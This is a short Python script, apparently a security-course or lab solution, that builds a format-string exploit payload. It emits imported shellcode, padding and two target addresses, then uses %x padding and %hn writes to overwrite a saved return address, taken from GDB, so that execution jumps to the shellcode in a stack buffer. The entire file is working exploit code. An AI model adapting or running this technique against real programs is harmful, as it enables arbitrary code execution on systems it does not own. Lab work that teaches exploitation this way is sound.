#!/usr/bin/env python3

import sys
from shellcode import shellcode
from struct import pack

# Data from GDB
ebp = 0xfffeec58
buf = 0xfffee450
buf_size = 2048
arg_buf_offset = 0x10

ret_low_n = 10 # Arg number to printf
ret_high_n = ret_low_n + 1

ret_low_a = ebp + 4
ret_high_a = ebp + 6

padding = b"A"
ret_low = buf & 0xFFFF
ret_high = (buf & 0xFFFF0000) >> 16

# Write 4-byte aligned shellcode + padding + ret_addresses
sys.stdout.buffer.write(shellcode)
sys.stdout.buffer.write(padding) # Padding back to 4-byte aligned
sys.stdout.buffer.write(pack("<I", ret_low_a))
sys.stdout.buffer.write(pack("<I", ret_high_a))

# Calculate how many more chars we must print to get the right %n
printed_chars = len(shellcode) + len(padding) + 8
x1 = ret_low - printed_chars

# Move the byte counter into the low bits of ret_addr
sys.stdout.buffer.write(b"%" + bytes(str(x1).encode('ascii')) + b"x")
sys.stdout.buffer.write(b"%" + bytes(str(ret_low_n).encode('ascii')) + b"$hn")

# Calculate how many more characters we need to print
printed_chars += x1
x2 = ret_high - printed_chars

# Move the new byte counter into the high bits of ret_addr
sys.stdout.buffer.write(b"%" + bytes(str(x2).encode('ascii')) + b"x")
sys.stdout.buffer.write(b"%" + bytes(str(ret_high_n).encode('ascii'))  + b"$hn")

